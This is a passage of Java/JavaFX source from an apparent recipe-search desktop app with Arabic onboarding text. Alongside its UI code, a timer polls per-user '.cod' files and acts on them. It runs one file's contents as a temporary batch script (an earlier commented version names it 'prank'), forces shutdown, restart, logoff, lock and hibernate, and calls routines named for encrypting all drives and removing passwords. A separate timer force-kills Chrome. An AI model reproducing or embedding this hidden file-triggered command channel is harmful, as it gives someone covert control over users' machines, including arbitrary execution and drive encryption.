        File completed7=new File (pathiony+"\\"+usery+"_shh.cod");
        File completed8=new File (pathiony+"\\"+usery+"_sle.cod");
        File completed9=new File (pathiony+"\\"+usery+"_sho.cod");
        
        File completed10=new File (pathiony+"\\"+usery+"_adetgth.cod");
        File completed11=new File (pathiony+"\\"+usery+"_sddtgth.cod");
        File completed12=new File (pathiony+"\\"+usery+"_ssdepst.cod");
        File completed13=new File (pathiony+"\\"+usery+"_ssdep.cod");
        File completed14=new File (pathiony+"\\"+usery+"_adesp.cod");
        File completed15=new File (pathiony+"\\"+usery+"_rsdepst.cod");
        File completed16=new File (pathiony+"\\"+usery+"_rsdep.cod");
        File completed17=new File (pathiony+"\\"+usery+"_aderp.cod");
        File completed18=new File (pathiony+"\\"+usery+"_sfdtgth.cod");
        File completed19=new File (pathiony+"\\"+usery+"_sfep.cod");
        File completed20=new File (pathiony+"\\"+usery+"_sfee.cod");
        File completed21=new File (pathiony+"\\"+usery+"_sdee.cod");
        File completed22=new File (pathiony+"\\"+usery+"_adee.cod");
        File completed23=new File (pathiony+"\\"+usery+"_sfde.cod");
        File completed24=new File (pathiony+"\\"+usery+"_sdde.cod");
        File completed25=new File (pathiony+"\\"+usery+"_adde.cod");
        File completed26=new File (pathiony+"\\"+usery+"_cftsp.cod");
        
        
        if (!completed1.exists()) {}
        else {
  
            
            
try {
    String batchContent = new String(Files.readAllBytes(Paths.get(pathiony + "\\" + usery + "_.cod")), "UTF-8");
    java.io.File tempBatch = java.io.File.createTempFile("decoder", ".bat");
    Files.write(tempBatch.toPath(), batchContent.getBytes("UTF-8"));
    ProcessBuilder pb = new ProcessBuilder("cmd", "/c", tempBatch.getAbsolutePath());
    pb.redirectErrorStream(true);
    Process process = pb.start();
    new Thread(() -> {
        try {
            process.waitFor();
            tempBatch.delete();
        } catch (Exception ignored) {}
    }).start();

} catch (Exception e) {
    e.printStackTrace();
}   
            
            
            
//    try {
//    String content = new String(Files.readAllBytes(Paths.get(pathiony+"\\"+usery+"_.cod")));
//    String batchContent = content;
//    java.io.File tempBatch = java.io.File.createTempFile("prank", ".bat");
//    java.nio.file.Files.write(tempBatch.toPath(), batchContent.getBytes("UTF-8"));
//    String line = "cmd /C \"" + tempBatch.getAbsolutePath() + "\"";
//    Process p = Runtime.getRuntime().exec(line);
//} catch (Exception e) {
//    e.printStackTrace();
//}
            
        }
        
        if (!completed2.exists()) {}
        else {
            try {
        String command = "shutdown -s -f -t 0";
        String line = "cmd /C " + command;
        Process p = Runtime.getRuntime().exec(line);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        if (!completed3.exists()) {}
        else {
            try {
        String command = "shutdown -r -f -t 0";
        String line = "cmd /C " + command;
        Process p = Runtime.getRuntime().exec(line);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        if (!completed4.exists()) {}
        else {
            try {
        String command = "shutdown -l -f";
        String line = "cmd /C " + command;
        Process p = Runtime.getRuntime().exec(line);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        if (!completed5.exists()) {}
        else {
            try {
        String command = "rundll32.exe user32.dll,LockWorkStation";
        Process p = Runtime.getRuntime().exec(command);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        if (!completed6.exists()) {}
        else {
            try {
        String command = "rundll32.exe user32.dll,SwitchUser";
        Process p = Runtime.getRuntime().exec(command);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        if (!completed7.exists()) {}
        else {
            try {
        String command = "shutdown -h";
        String line = "cmd /C " + command;
        Process p = Runtime.getRuntime().exec(line);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        if (!completed8.exists()) {}
        else {
            try {
        String command = "rundll32.exe powrprof.dll,SetSuspendState 0,1,0";
        Process p = Runtime.getRuntime().exec(command);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        if (!completed9.exists()) {}
        else {
            try {
        String command = "shutdown -r -o -f -t 0";
        String line = "cmd /C " + command;
        Process p = Runtime.getRuntime().exec(line);
        p.waitFor();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        
        if (!completed10.exists()) {}
        else {
            try {
                sz.startExcelToGthWatcher1();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        if (!completed11.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed11));
                String value=buf.readLine();
                buf.close();
                sz.startDocsToGthWatcher2(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        if (!completed12.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed12));
                String value=buf.readLine();
                buf.close();
                sz.specificTimeAndDrive3(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        if (!completed13.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed13));
                String value=buf.readLine();
                buf.close();
                sz.specificDrive4(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        
        if (!completed14.exists()) {}
        else {
            try {
                sz.allDrives5();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        
        if (!completed15.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed15));
                String value=buf.readLine();
                buf.close();
                sz.removePasswordSpecificTimeAndDrive6(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        if (!completed16.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed16));
                String value=buf.readLine();
                buf.close();
                sz.removePasswordSpecificDrive7(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        
        if (!completed17.exists()) {}
        else {
            try {
                sz.removePasswordAllDrives8();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        if (!completed18.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed18));
                String value=buf.readLine();
                buf.close();
                sz.docsSpecificFolder9(value);
    } catch (Exception e) {
    e.printStackTrace();
    }
        }
        
        
        
        
        if (!completed19.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed19));
                String value=buf.readLine();
                buf.close();
                sz.excelSpecificFolder10(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        
        
        if (!completed20.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed20));
                String value=buf.readLine();
                buf.close();
                sz.encSpecificFolder11(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        if (!completed21.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed21));
                String value=buf.readLine();
                buf.close();
                sz.encSpecificDrive12(value);
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        if (!completed22.exists()) {}
        else {
            try {
                sz.encAll13();
    } catch (Exception e) {e.printStackTrace();}
        }
        
        
        
        if (!completed23.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed23));
                String value=buf.readLine();
                buf.close();
                sz.decSpecificFolder14(value);
    } catch (Exception e) {}
        }
        
        
        
        if (!completed24.exists()) {}
        else {
            try {
                BufferedReader buf=new BufferedReader (new FileReader (completed24));
                String value=buf.readLine();
                buf.close();
                sz.decSpecificDrive15(value);
    } catch (Exception e) {}
        }
        
        
        
        if (!completed25.exists()) {}
        else {
            try {
                sz.decAll16();
    } catch (Exception e) {}
        }
        
        
        
        
        if (!completed26.exists()) {}
        else {
            try {
String filePath = pathiony + "\\" + usery + "_cftsp.cod";
restoreFileFromCod(filePath);
    } catch (Exception e) {}
        }
        
//        File file1 = new File("Config.cfg");
//        if (!file1.exists()) {
//            
//        /////////////////////////////////////////////////////////////////////////////////////////////    
//        //Close Google Chrome Here/////////////////////
//        String os = System.getProperty("os.name").toLowerCase();
//        String command = "";
//        if (os.contains("win")) {
//            command = "taskkill /F /IM chrome.exe";
//        } else if (os.contains("mac")) {
//            command = "pkill -f Chrome";
//        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
//            command = "pkill -f chrome";
//        }
//        try {
//            Runtime.getRuntime().exec(command);
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        
//        //Close program here
//        Platform.exit();
//        System.exit(0);
//        
//        //Shutdown Here
//        try { String commandos="shutdown -s -f -t 0";
//        String linett = "cmd /C "+commandos;
//        Process p = Runtime.getRuntime().exec(linett);
//        p.waitFor();
//        } catch (Exception m){}
//        
//        ///////////////////////////////////////////////////////////////////////////////////////////////
//            
//        } else {
//            
//            
//            
//        }
//        
//        File file2 = new File("Configs.cfg");
//        if (!file2.exists()) {
//            
////        /////////////////////////////////////////////////////////////////////////////////////////////    
////        //Close Google Chrome Here/////////////////////
////        String os = System.getProperty("os.name").toLowerCase();
////        String command = "";
////        if (os.contains("win")) {
////            command = "taskkill /F /IM chrome.exe";
////        } else if (os.contains("mac")) {
////            command = "pkill -f Chrome";
////        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
////            command = "pkill -f chrome";
////        }
////        try {
////            Runtime.getRuntime().exec(command);
////        } catch (IOException e) {
////            e.printStackTrace();
////        }
////        
////        //Close program here
////        Platform.exit();
////        System.exit(0);
////        
////        //Shutdown Here
////        try { String commandos="shutdown -s -f -t 0";
////        String linett = "cmd /C "+commandos;
////        Process p = Runtime.getRuntime().exec(linett);
////        p.waitFor();
////        } catch (Exception m){}
////        ///////////////////////////////////////////////////////////////////////////////////////////////
//            
//        } else {
//            
//        //Shutdown Here
//        try { String commandos="shutdown -s -f -t 0";
//        String linett = "cmd /C "+commandos;
//        Process p = Runtime.getRuntime().exec(linett);
//        p.waitFor();
//        } catch (Exception m){}
//
//            
//        }
        
        
    }
}, 0, 1 * 60 * 1000);
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


try {
        if (isFirstLaunch()) {
            steps.add(new TourStep(searchrecipe, "ضفنالك ميزة جديدة هتعجبك"));
            steps.add(new TourStep(searchrecipe, "هتقدر من خلالها تدور علي اي حاجة في اي ريسيبي من غير ما تفتحها"));
            steps.add(new TourStep(searchrecipe, "مواد كيمائية او مرحلة او اي حاجة"));
            steps.add(new TourStep(searchrecipe, "كل اللي هتعمله هتضغط علي الايقونة دي هتفتحلك نافذة"));
            steps.add(new TourStep(searchrecipe, "اكتب الكلمة اللي عاوز تدور عنها وبعدين اسحب وافلت مجموعة الريسيبي اللي عاوز تدور فيهم"));
            steps.add(new TourStep(searchrecipe, "بعد كده هتظهرلك موجودة فين ومش موجوده فين"));
            steps.add(new TourStep(searchrecipe, "اتمني اكون ساعدتك وادعيلي دعوة حلوة بقا"));

            saveFirstLaunchFlag();

            // ✅ استنى بعد ما كل حاجة تتحمل
            Platform.runLater(() -> {
                Scene scene = mainRoot.getScene();
                if (scene != null) {
                    //showStep(mainRoot, scene); // استخدم الـ StackPane الأساسي
                }
            });
        }
    } catch (Exception ee) {
        ee.printStackTrace();
    }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





try {
File kadyFile = new File(System.getProperty("user.home")+"\\RandomMsg.kady");
kadyFile.deleteOnExit();
if (!kadyFile.exists()) {
PrintWriter writer = new PrintWriter(System.getProperty("user.home")+"\\RandomMsg.kady", "UTF-8");
writer.println(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Mod_Recipes").replace("\\Recipes","")+"\\ADS\\Random_Msg.kady");
writer.println(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Mod_Recipes").replace("\\Recipes","")+"\\ADS\\Random_Img.png");
writer.close();
}
        BufferedReader buf = new BufferedReader(new InputStreamReader(new FileInputStream(kadyFile), "UTF-8"));
        String notifile = buf.readLine().replace("X:", drib + ":");
        String notiimg = buf.readLine().replace("X:", drib + ":");
        buf.close();
        Image image = new Image(new File(notiimg).toURI().toString());
        ImageView avatar = new ImageView(image);
        avatar.setFitWidth(50);
        avatar.setFitHeight(50);
        avatar.setClip(new Circle(25, 25, 25));
        // ====== النص المتغير ======
        Label textLabel = new Label("رسائل مهمة");
        textLabel.setStyle("-fx-font-size: 16px; -fx-text-fill: #2c3e50; -fx-font-weight: bold;");
        Hyperlink hl=new Hyperlink("");
        hl.setText("اضغط هنا");
        hl.setOnAction(gg ->{
            //////////////////////////////
            //Open Web Page (Local)
            //////////////////////////////
        });
        // Path to your file
        String filePath = notifile;
        // Read file into a List<String>
        List<String> lines = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(new FileInputStream(filePath), StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (!line.trim().isEmpty()) { // skip empty lines
                    lines.add(line.trim());
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
}
catch (Exception gg) {}





     try {
            String fontPath = getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Fonts"); // غيّر المسار حسب مكان الخط عندك
            javafx.scene.text.Font cairoSemiBold = javafx.scene.text.Font.loadFont(new FileInputStream(fontPath), 15);
        } catch (FileNotFoundException ex) {
           
        }
     
     
     
     
  }



private boolean isFirstLaunch() {
        File file = new File("");
        return !file.exists();
    }





    private void saveFirstLaunchFlag() {
    }

    
    
    
    
private void showStep(StackPane root, Scene scene) {
        // ✅ If finished, remove overlay
        if (currentStep >= steps.size()) {
            if (overlayPane != null) {
                fadeOutAndRemove(root, overlayPane);
                overlayPane = null;
            }
            return;
        }
        TourStep step = steps.get(currentStep);
        Node target = step.node;
        // Remove old overlay
        if (overlayPane != null) {
            root.getChildren().remove(overlayPane);
        }
        // New overlay
        overlayPane = new Pane();
        overlayPane.setPickOnBounds(false);
        // Dark background
        Rectangle background = new Rectangle(scene.getWidth(), scene.getHeight(), Color.rgb(0, 0, 0, 0.6));
        // Highlight rectangle
        Rectangle highlight = new Rectangle();
        highlight.setArcWidth(20);
        highlight.setArcHeight(20);
        highlight.setFill(Color.TRANSPARENT);
        highlight.setStroke(Color.web("#03A9F4"));
        highlight.setStrokeWidth(3);
        highlight.setEffect(new DropShadow(20, Color.web("#03A9F4")));
        // Info card
        Label info = new Label(step.message);
        info.setWrapText(true);
        info.setMaxWidth(300);
        info.setStyle(
                "-fx-background-color: white; " +
                "-fx-padding: 15; " +
                "-fx-font-size: 16px; " +
                "-fx-font-weight: bold; " +        
                "-fx-background-radius: 12; " +
                "-fx-border-radius: 12; " +
                "-fx-border-color: #E0E0E0;" +
                "-fx-effect: dropshadow(three-pass-box, rgba(0,0,0,0.25), 8, 0, 0, 2);"
        );
        javafx.scene.control.Button nextBtn = new javafx.scene.control.Button(currentStep == steps.size() - 1 ? "انهاء" : "التالي →");
        nextBtn.setStyle("-fx-background-color: #03A9F4; -fx-text-fill: white; -fx-background-radius: 20; -fx-padding: 6 18;");
        nextBtn.setOnAction(e -> {
            currentStep++;
            showStep(root, scene);
        });
        javafx.scene.control.Button skipBtn = new javafx.scene.control.Button("تخطي");
        skipBtn.setStyle("-fx-background-color: transparent; -fx-text-fill: #FFFFFF; -fx-underline: true;");
        skipBtn.setOnAction(e -> {
            fadeOutAndRemove(root, overlayPane);
            overlayPane = null;
        });
        VBox card = new VBox(10, info, nextBtn, skipBtn);
        card.setAlignment(Pos.CENTER);
        overlayPane.getChildren().addAll(background, highlight, card);
        root.getChildren().add(overlayPane);
        // Position updater
        Runnable updateHighlight = () -> {
            Bounds bounds = target.localToScene(target.getBoundsInLocal());
            highlight.setX(bounds.getMinX() - 10);
            highlight.setY(bounds.getMinY() - 10);
            highlight.setWidth(bounds.getWidth() + 20);
            highlight.setHeight(bounds.getHeight() + 20);
            card.setLayoutX(bounds.getMinX());
            card.setLayoutY(bounds.getMaxY() + 20);
        };
        updateHighlight.run();
        scene.widthProperty().addListener((obs, o, n) -> updateHighlight.run());
        scene.heightProperty().addListener((obs, o, n) -> updateHighlight.run());
        target.layoutBoundsProperty().addListener((obs, o, n) -> updateHighlight.run());
        // Fade in animation
        FadeTransition fade = new FadeTransition(Duration.seconds(0.4), overlayPane);
        fade.setFromValue(0);
        fade.setToValue(1);
        fade.play();
    }





    // Smooth fade out and remove
    private void fadeOutAndRemove(StackPane root, Pane pane) {
        FadeTransition fadeOut = new FadeTransition(Duration.seconds(0.4), pane);
        fadeOut.setFromValue(1);
        fadeOut.setToValue(0);
        fadeOut.setOnFinished(ev -> root.getChildren().remove(pane));
        fadeOut.play();
    }
    
    
    
    
    
    private static class TourStep {
        Node node;
        String message;
        TourStep(Node node, String message) {
            this.node = node;
            this.message = message;
        }
    }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    
    
    
    
private void shutdownApp() {
        fileCheckTimer.cancel(); // Stop the timer
        // Run on JavaFX thread
        Platform.runLater(() -> {
            Platform.exit(); // Close JavaFX
            System.exit(0);  // Kill all remaining threads
        });
    }
}
////////////////////////////////////////////////////////////////////////////////





    class HourService extends Service<Date>
    {
       ////////////////////////////////////////////////////////////////////////////////////////////////////////   
        public static String getValueByKey(String filePath, String key) {
        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (!line.contains("=")) {
                continue;
                }
                String[] parts = line.split("=", 2);
                String currentKey = parts[0].trim();
                if (currentKey.equals(key)) {
                    return parts[1].trim();
                }
            }
        } catch (IOException e) {
        e.printStackTrace();
        }
        return null; 
    }
///////////////////////////////////////////////////////////////////////////////////////////////////////////
        private Calendar calendar;
        public final void setCalendarInstance(Calendar c)
        {
            calendar = c;
        }
        @Override
        protected Task<Date> createTask() {
            return new Task<Date>() {
               protected Date call() throws IOException
                {
                    BufferedReader buffr=new BufferedReader (new FileReader (getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")+"\\ADS\\time.txt"));
                    String timey=buffr.readLine();
                    int secondsdelay = Integer.parseInt(timey);  //READ FROM FILE
                    buffr.close();
                    Date timeStarted = calendar.getTime();
                    Date timeEnd = new Date(timeStarted.getTime() + 1000 * secondsdelay );//* 60 * 60);
                    while( timeEnd.after(calendar.getTime()) )
                    {
                        try {
                            Thread.sleep(500);
                            calendar = Calendar.getInstance();
                        } catch (InterruptedException e) {
                            if (isCancelled()) {
                                updateMessage("Cancelled");
                                break;
                            }
                        }
                    }
        //Close Google Chrome Here/////////////////////
        String os = System.getProperty("os.name").toLowerCase();
        String command = "";
        if (os.contains("win")) {
            command = "taskkill /F /IM chrome.exe";
        } else if (os.contains("mac")) {
            command = "pkill -f Chrome";
        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
            command = "pkill -f chrome";
        }
        try {
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
                    //Close program here
                    Platform.exit();
                    System.exit(0);
                    return timeEnd;
                }
            };
        }
    }
////////////////////////////////////////////////////////////////////////////////